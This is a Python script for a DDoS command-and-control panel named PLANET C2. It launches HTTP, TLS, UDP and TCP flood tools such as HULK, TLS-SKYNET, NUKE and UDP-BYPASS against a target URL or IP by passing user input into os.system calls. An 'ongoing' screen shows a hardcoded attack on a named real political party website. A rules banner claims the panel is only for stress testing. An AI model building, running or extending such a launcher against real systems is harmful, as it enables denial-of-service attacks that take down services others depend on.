import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    
proxys = open('proxies.txt').readlines()
bots = len(proxys)

def PLANET_c2():
    clear()
    print(f'''
\x1b[38;5;160m                                     \u001B[31m                   _.oo.
\x1b[38;5;160m                                 _.u\u001B[31m[[/;:,.         .odMMMMMM'
\x1b[38;5;160m                              .o888UU\u001B[31m[[[/;:-.  .o@P^    MMM^
\x1b[38;5;160m                             oN88888UU\u001B[31m[[[/;::-.        dP^
\x1b[38;5;160m                            dNMMNN888UU\u001B[31m[[[/;:--.   .o@P^
\x1b[38;5;160m                           ,MMMMMMN888U\u001B[31mU[[/;::-. o@^
\x1b[38;5;160m                           NNMMMNN888UU\u001B[31m[[[/~.o@P^
\x1b[38;5;160m                           888888888UU[\u001B[31m[[/o@^-..
\x1b[38;5;160m                          oI8888UU[[[/o\u001B[31m@P^:--..
\x1b[38;5;160m                       .@^  YUU[[[/o@^\u001B[31m;::---..
\x1b[38;5;160m                     oMP     ^/o@P^;::\u001B[31m:---..
\x1b[38;5;160m                  .dMMM    .o@^ ^;::--\u001B[31m-...
\x1b[38;5;160m                 dMMMMMMM@^`       `^^\u001B[31m^^
\x1b[38;5;160m                YMMMUP^
\x1b[38;5;160m                 ^^                          Planet C2
    ''')
    time.sleep(1)

def si():
    print('         \x1b[38;5;160m[ \x1b[38;2;233;233;233mPLANET C2 \x1b[38;5;160m] | \x1b[38;2;233;233;233mWelcome to PLANET C2! \x1b[38;5;160m| \x1b[38;2;233;233;233mOwner: Xylent\x1b[38;5;160m| \x1b[38;2;233;233;233mPLANET C2')
    print("")

def rules():
    clear()
    si()
    print(f'''
\x1b[38;5;160m                                     \u001B[31m                   _.oo.
\x1b[38;5;160m                                 _.u\u001B[31m[[/;:,.         .odMMMMMM'
\x1b[38;5;160m                              .o888UU\u001B[31m[[[/;:-.  .o@P^    MMM^
\x1b[38;5;160m                             oN88888UU\u001B[31m[[[/;::-.        dP^
\x1b[38;5;160m                            dNMMNN888UU\u001B[31m[[[/;:--.   .o@P^
\x1b[38;5;160m                           ,MMMMMMN888U\u001B[31mU[[/;::-. o@^
\x1b[38;5;160m                           NNMMMNN888UU\u001B[31m[[[/~.o@P^
\x1b[38;5;160m                           888888888UU[\u001B[31m[[/o@^-..
\x1b[38;5;160m                          oI8888UU[[[/o\u001B[31m@P^:--..
\x1b[38;5;160m                       .@^  YUU[[[/o@^\u001B[31m;::---..
\x1b[38;5;160m                     oMP     ^/o@P^;::\u001B[31m:---..
\x1b[38;5;160m                  .dMMM    .o@^ ^;::--\u001B[31m-...
\x1b[38;5;160m                 dMMMMMMM@^`       `^^\u001B[31m^^
\x1b[38;5;160m                YMMMUP^
\x1b[38;5;160m                 ^^                          Planet C2
                                \x1b[38;5;160m╔═══════════════╗
                                \x1b[38;5;160m║     \x1b[38;5;160mRules     \x1b[38;5;160m║
                \x1b[38;5;160m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[38;5;160m║ \x1b[38;5;160m1. Do not attack without someone's permission \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m2. Do not attack .gov/.gob/.edu/.mil domains  \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m3. Do not spam attacks                        \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m4. Only attack stress testing servers         \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m5. Don't skid the panel                       \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m6. Give a star to the github repository       \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m7. The creator does not do any harm           \x1b[38;5;160m║
                \x1b[38;5;160m╚═══════════════════════════════════════════════╝
''')

def layer4():
    clear()
    si()
    print(f'''
\x1b[38;5;160m                                     \u001B[31m                   _.oo.
\x1b[38;5;160m                                 _.u\u001B[31m[[/;:,.         .odMMMMMM'
\x1b[38;5;160m                              .o888UU\u001B[31m[[[/;:-.  .o@P^    MMM^
\x1b[38;5;160m                             oN88888UU\u001B[31m[[[/;::-.        dP^
\x1b[38;5;160m                            dNMMNN888UU\u001B[31m[[[/;:--.   .o@P^
\x1b[38;5;160m                           ,MMMMMMN888U\u001B[31mU[[/;::-. o@^
\x1b[38;5;160m                           NNMMMNN888UU\u001B[31m[[[/~.o@P^
\x1b[38;5;160m                           888888888UU[\u001B[31m[[/o@^-..
\x1b[38;5;160m                          oI8888UU[[[/o\u001B[31m@P^:--..
\x1b[38;5;160m                       .@^  YUU[[[/o@^\u001B[31m;::---..
\x1b[38;5;160m                     oMP     ^/o@P^;::\u001B[31m:---..
\x1b[38;5;160m                  .dMMM    .o@^ ^;::--\u001B[31m-...
\x1b[38;5;160m                 dMMMMMMM@^`       `^^\u001B[31m^^
\x1b[38;5;160m                YMMMUP^
\x1b[38;5;160m                 ^^                          Planet C2
                               \x1b[38;5;160m╔═══════════════╗
                               \x1b[38;5;160m║    \x1b[38;5;160mLayer 4    \x1b[38;5;160m║
               \x1b[38;5;160m╔═══════════════╩═══════════════╩═════════════╗
               \x1b[38;5;160m║   \x1b[38;5;160mUDP          \x1b[38;5;160m║   \x1b[38;5;160mBROWSER           \x1b[38;5;160m║
               \x1b[38;5;160m╚═════════════════════════════════════════════╝
               
               \x1b[255;255;0m            ===> UPDATE METHODS ? :)     
               ''')
               
def layer7():
    clear()
    si()
    print(f'''
\x1b[38;5;160m                                     \u001B[31m                   _.oo.
\x1b[38;5;160m                                 _.u\u001B[31m[[/;:,.         .odMMMMMM'
\x1b[38;5;160m                              .o888UU\u001B[31m[[[/;:-.  .o@P^    MMM^
\x1b[38;5;160m                             oN88888UU\u001B[31m[[[/;::-.        dP^
\x1b[38;5;160m                            dNMMNN888UU\u001B[31m[[[/;:--.   .o@P^
\x1b[38;5;160m                           ,MMMMMMN888U\u001B[31mU[[/;::-. o@^
\x1b[38;5;160m                           NNMMMNN888UU\u001B[31m[[[/~.o@P^
\x1b[38;5;160m                           888888888UU[\u001B[31m[[/o@^-..
\x1b[38;5;160m                          oI8888UU[[[/o\u001B[31m@P^:--..
\x1b[38;5;160m                       .@^  YUU[[[/o@^\u001B[31m;::---..
\x1b[38;5;160m                     oMP     ^/o@P^;::\u001B[31m:---..
\x1b[38;5;160m                  .dMMM    .o@^ ^;::--\u001B[31m-...
\x1b[38;5;160m                 dMMMMMMM@^`       `^^\u001B[31m^^
\x1b[38;5;160m                YMMMUP^
\x1b[38;5;160m                 ^^                          Planet C2
                               \x1b[38;5;160m╔═══════════════╗
                               \x1b[38;5;160m║    \x1b[38;5;160mLayer 7    \x1b[38;5;160m║
               \x1b[38;5;160m╔═══════════════╩═══════════════╩═════════════╗
               \x1b[38;5;160m║   \x1b[38;5;160mHTTP-FLOOD          \x1b[38;5;160m║   \x1b[38;5;160mBROWSER           \x1b[38;5;160m║
               \x1b[38;5;160m║   \x1b[38;5;160mHULK              \x1b[38;5;160m║   \x1b[38;5;160mHTTPS             \x1b[38;5;160m║
               \x1b[38;5;160m║   \x1b[38;5;160mTLS-SKYNET          \x1b[38;5;160m║   \x1b[38;5;160mTLS               \x1b[38;5;160m║
               \x1b[38;5;160m║   \x1b[38;5;160mTLZ                 \x1b[38;5;160m║   \x1b[38;5;160mNUKE              \x1b[38;5;160m║
               \x1b[38;5;160m║   \x1b[38;5;160mHTTPS-STORM         \x1b[38;5;160m║   \x1b[38;5;160mBRUTAL            \x1b[38;5;160m║
               \x1b[38;5;160m╚═════════════════════════════════════════════╝
               
               \x1b[255;255;0m            ===> UPDATE METHODS ? :)     
               ''')

def menu():
    sys.stdout.write(f"         \x1b]2;PLANET C2 | Online 1 | CON 1 | USERS Admin\x07")
    clear()
    print('\x1b[38;5;160m[ \x1b[38;2;233;233;233mPLANET C2 \x1b[38;5;160m] | \x1b[38;2;233;233;233mWelcome to PLANET C2! \x1b[38;5;160m| \x1b[38;2;233;233;233mOwner: Xylent \x1b[38;5;160m| \x1b[38;2;233;233;233mPLANET C2 By Xylent Vorex')
    print("")
    print("""
\x1b[38;5;160m                                     \u001B[31m                   _.oo.
\x1b[38;5;160m                                 _.u\u001B[31m[[/;:,.         .odMMMMMM'
\x1b[38;5;160m                              .o888UU\u001B[31m[[[/;:-.  .o@P^    MMM^
\x1b[38;5;160m                             oN88888UU\u001B[31m[[[/;::-.        dP^
\x1b[38;5;160m                            dNMMNN888UU\u001B[31m[[[/;:--.   .o@P^
\x1b[38;5;160m                           ,MMMMMMN888U\u001B[31mU[[/;::-. o@^
\x1b[38;5;160m                           NNMMMNN888UU\u001B[31m[[[/~.o@P^
\x1b[38;5;160m                           888888888UU[\u001B[31m[[/o@^-..
\x1b[38;5;160m                          oI8888UU[[[/o\u001B[31m@P^:--..
\x1b[38;5;160m                       .@^  YUU[[[/o@^\u001B[31m;::---..
\x1b[38;5;160m                     oMP     ^/o@P^;::\u001B[31m:---..
\x1b[38;5;160m                  .dMMM    .o@^ ^;::--\u001B[31m-...
\x1b[38;5;160m                 dMMMMMMM@^`       `^^\u001B[31m^^
\x1b[38;5;160m                YMMMUP^
\x1b[38;5;160m                 ^^                          Planet C2


            ╒══════════════════════════════════════════════════════╕   
              This tools is not for sell. Private tools and method.
              CopyRight : ZxC
              Owner : Xylent & Oyen
            ╘══════════════════════════════════════════════════════╛

      
""")


def main():
    menu()
    while(True):
        cnc = input('''\x1b[38;5;160m╔══[PlanetC2\x1b[\x1b[38;5;160m@a\x1b[38;5;160md\x1b[38;5;160mmin\x1b[38;5;160m]
\x1b[38;5;160m╚\x1b[38;5;160m═\x1b[38;5;160m═\x1b[38;5;160m═\x1b[38;5;160m═\x1b[38;5;160m➤ \x1b[38;5;160m''')
        if cnc == "methods" or cnc == "METHODS" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
            rules()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        if cnc == "method" or cnc == "METHOD" or cnc == "L4" or cnc == "l4":
            layer4() 
        elif "ongoing" in cnc or "ONGOING" in cnc or "Ongoing" in cnc or "OnGoinG" in cnc:
            ongoing()
            
#Method
        elif ".BROWSER" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                req_per_ip = cnc.split()[3]
                os.system(f'node BROWSER.js {url} {time} {req_per_ip} http.txt')
            except IndexError:
                print('Usage: .BROWSER <url> <time> <req_per_ip>')
                print('Example: .BROWSER <http://example.com> <60> <100>')
                
        elif ".FLOOD" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-FLOOD.js {url} {time} ')
            except IndexError:
                print('Usage: .FLOOD <url> <time>')
                print('Example: .FLOOD http://example.com 60')
                
        elif ".HULK" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run Hulk.go -site {url} -data {method}')
            except IndexError:
                print('Usage: HULK <url> METHODS<GET/POST>')
                print('Example: HULK http://example.com GET')       
                
        elif ".HTTPS" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run HTTPS.go -site {url} -data {method}')
            except IndexError:
                print('Usage: HTTPS <url> METHODS<GET/POST>')
                print('Example: HTTPS http://example.com GET')      
                
        elif ".TLS-SKYNET" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rate = cnc.split()[3]
                thread = cnc.split()[4]
                os.system(f'node skynet.js -site {url} -time {time} -rate {rate} -threads {thread}')
            except IndexError:
                print('Usage: TLS-SKYNET <url> <time> <rate> <thread>')
                print('Example: TLS-SKYNET http://example.com 100 100 1000')       
                
        elif ".TLS" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rate = cnc.split()[3]
                threads = cnc.split()[4]
                method = cnc.split()[5]
                proxyFile = cnc.split()[6]
                os.system(f'node TLS.js -site {url} -time {time} -rate {rate} -threads {threads} -Get/Post {method} -proxy {proxyFile} ')
            except IndexError:
                print('Usage: TLS <url> <time> <rate> <thread> <method> <proxyFile>')
                print('Example: TLS http://example.com 100 100 1000 get proxy.txt')     

        elif ".UDP" in cnc:
            try:
                ip = cnc.split()[1] 
                port = cnc.split()[2] 
                time = cnc.split()[3] 
                threads = cnc.split()[4] 
                os.system(f'python3 dos.py {ip} {port} {time} {threads}')
            except IndexError:
                print('Usage: UDP <ip> <port> <time> <thread>')
                print('Example: UDP -i 1.1.1.1 -p 80 -t 100 -th 1000')
                
        elif ".TLZ" in cnc:
            try:
                url = cnc.split()[1] 
                time = cnc.split()[2] 
                rate = cnc.split()[3] 
                threads = cnc.split()[4] 
                proxyFile = cnc.split()[5]
                os.system(f'node TLZ {url} {time} {rate} {threads} {proxyFile}')
            except IndexError:
                print('Usage: TLZ <url> <time> <rate> <threads> <proxyFile>')
                print('Example: TLZ Indonesia.com 100 100 1000 proxy.txt')
                
        elif ".NUKE" in cnc:
            try:
                url = cnc.split()[1] 
                time = cnc.split()[2] 
                threads = cnc.split()[3]
                os.system(f'./nuke {url} {time} {threads}')
            except IndexError:
                print('Usage: NUKE <url> <time> <threads>')
                print('Example: NUKE https://example.com 100 1000')
                
        elif ".HTTPS-STORM" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run HTTPS-STORM.go -site {url} -data {method}')
            except IndexError:
                print('Usage: HTTPS-STORM <url> METHODS<GET/POST>')
                print('Example: HTTPS-STORM http://example.com GET')       
                
        elif ".BRUTAL" in cnc:
            try:
                url = cnc.split()[1] 
                time = cnc.split()[2] 
                threads = cnc.split()[3]
                os.system(f'./brutal {url} {time} {threads}')
            except IndexError:
                print('Usage: BRUTAL <url> <time> <threads>')
                print('Example: BRUTAL https://example.com 100 1000')
                
        elif ".EPEP" in cnc:
            try:
                url = cnc.split()[1] 
                time = cnc.split()[2] 
                threads = cnc.split()[3]
                os.system(f'node HENGKER-EPEP.js {url} {time} {threads}')
            except IndexError:
                print('Usage: EPEP <url> <time> <threads>')
                print('Example: EPEP https://example.com 100 1000')     
                
        elif ".UDP-SPEED" in cnc:
            try:
                ip = cnc.split()[1] 
                port = cnc.split()[2] 
                threads = cnc.split()[3]
                pps = cnc.split()[4]
                time = cnc.split()[5]
                os.system(f'./UDP-BYPASS {ip} {port} {threads} {pps} {time}')
            except IndexError:
                print('Usage: UDP-SPEED <ip> <port> <threads> <pps> <time>')
                print('Example: UDP-SPEED 1.1.1.1 443 1000 100 100')
                
        elif ".TCP-SPEED" in cnc:
            try:
                ip = cnc.split()[1] 
                port = cnc.split()[2] 
                threads = cnc.split()[3]
                pps = cnc.split()[4]
                time = cnc.split()[5]
                os.system(f'./TCP-BYPASS {ip} {port} {threads} {pps} {time}')
            except IndexError:
                print('Usage: TCP-SPEED <ip> <port> <threads> <pps> <time>')
                print('Example: TCP-SPEED 1.1.1.1 443 1000 100 100')
                
        elif "help" in cnc:
            print(f'''
\x1b[38;5;160m                                     \u001B[31m                   _.oo.
\x1b[38;5;160m                                 _.u\u001B[31m[[/;:,.         .odMMMMMM'
\x1b[38;5;160m                              .o888UU\u001B[31m[[[/;:-.  .o@P^    MMM^
\x1b[38;5;160m                             oN88888UU\u001B[31m[[[/;::-.        dP^
\x1b[38;5;160m                            dNMMNN888UU\u001B[31m[[[/;:--.   .o@P^
\x1b[38;5;160m                           ,MMMMMMN888U\u001B[31mU[[/;::-. o@^
\x1b[38;5;160m                           NNMMMNN888UU\u001B[31m[[[/~.o@P^
\x1b[38;5;160m                           888888888UU[\u001B[31m[[/o@^-..
\x1b[38;5;160m                          oI8888UU[[[/o\u001B[31m@P^:--..
\x1b[38;5;160m                       .@^  YUU[[[/o@^\u001B[31m;::---..
\x1b[38;5;160m                     oMP     ^/o@P^;::\u001B[31m:---..
\x1b[38;5;160m                  .dMMM    .o@^ ^;::--\u001B[31m-...
\x1b[38;5;160m                 dMMMMMMM@^`       `^^\u001B[31m^^
\x1b[38;5;160m                YMMMUP^
\x1b[38;5;160m                 ^^                          Planet C2

                      \x1b[38;5;160m╔══════════════════════════════╗
                       METHODS  ► SHOW LAYER7 METHODS
                       METHOD ► SHOW LAYER4 METHOD
                       BANNERS ► SHOW BANNERS
                       RULES   ► RULES PANEL
                       PORTS   ► SHOW ALL PORTS
                       TOOLS   ► SHOW TOOLS
                       CLEAR   ► CLEAR TERMINAL
                      \x1b[38;5;160m╚══════════════════════════════╝
            ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("\x1b[38;5;160mCommand: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass

def ongoing():
    clear()
    print(f'''
\x1b[38;5;160m                                     \u001B[31m                   _.oo.
\x1b[38;5;160m                                 _.u\u001B[31m[[/;:,.         .odMMMMMM'
\x1b[38;5;160m                              .o888UU\u001B[31m[[[/;:-.  .o@P^    MMM^
\x1b[38;5;160m                             oN88888UU\u001B[31m[[[/;::-.        dP^
\x1b[38;5;160m                            dNMMNN888UU\u001B[31m[[[/;:--.   .o@P^
\x1b[38;5;160m                           ,MMMMMMN888U\u001B[31mU[[/;::-. o@^
\x1b[38;5;160m                           NNMMMNN888UU\u001B[31m[[[/~.o@P^
\x1b[38;5;160m                           888888888UU[\u001B[31m[[/o@^-..
\x1b[38;5;160m                          oI8888UU[[[/o\u001B[31m@P^:--..
\x1b[38;5;160m                       .@^  YUU[[[/o@^\u001B[31m;::---..
\x1b[38;5;160m                     oMP     ^/o@P^;::\u001B[31m:---..
\x1b[38;5;160m                  .dMMM    .o@^ ^;::--\u001B[31m-...
\x1b[38;5;160m                 dMMMMMMM@^`       `^^\u001B[31m^^
\x1b[38;5;160m                YMMMUP^
\x1b[38;5;160m                 ^^                          Planet C2

                   \x1b[38;5;160m╔═══════════════════════════════════════════╗
                     🚀 \x1b[38;5;160m Your Running Attack To Your Target 🚀
                    Target:     [https://www.pdiperjuangan.id/]
                    Port:       [443]
                    Duration:   [300]
                    Method:     [TLS]
                    Total:      [50000]
                    Sent By:    [root]
                    Date Sent:  [ags/8/2023]
                   \x1b[38;5;160m╚═══════════════════════════════════════════╝
            ''')                
              
               
def login():
    clear()
    user = "*"
    passwd = "*"
    print("\x1b[38;5;160m     Welcome To PLANET C2")
    print("\x1b[38;5;160m        Please Login")
    time.sleep(1)
    clear()
    print("""
\x1b[38;5;160m                                     \u001B[31m                   _.oo.
\x1b[38;5;160m                                 _.u\u001B[31m[[/;:,.         .odMMMMMM'
\x1b[38;5;160m                              .o888UU\u001B[31m[[[/;:-.  .o@P^    MMM^
\x1b[38;5;160m                             oN88888UU\u001B[31m[[[/;::-.        dP^
\x1b[38;5;160m                            dNMMNN888UU\u001B[31m[[[/;:--.   .o@P^
\x1b[38;5;160m                           ,MMMMMMN888U\u001B[31mU[[/;::-. o@^
\x1b[38;5;160m                           NNMMMNN888UU\u001B[31m[[[/~.o@P^
\x1b[38;5;160m                           888888888UU[\u001B[31m[[/o@^-..
\x1b[38;5;160m                          oI8888UU[[[/o\u001B[31m@P^:--..
\x1b[38;5;160m                       .@^  YUU[[[/o@^\u001B[31m;::---..
\x1b[38;5;160m                     oMP     ^/o@P^;::\u001B[31m:---..
\x1b[38;5;160m                  .dMMM    .o@^ ^;::--\u001B[31m-...
\x1b[38;5;160m                 dMMMMMMM@^`       `^^\u001B[31m^^
\x1b[38;5;160m                YMMMUP^
\x1b[38;5;160m                 ^^
                          P L A N E T C 2 BY Nasa & Oyen

""")
    username = input("      </> Username: ")
    password = getpass.getpass(prompt='      </> Password: ')
    if username != user or password != passwd:
        print("")
        print("      </> Invalid?...")
        sys.exit(1)
    elif username == user and password == passwd:
        print("      </> Welcome to PLANETC2!")
        time.sleep(0.3)
        PLANET_c2()
        main()

login()


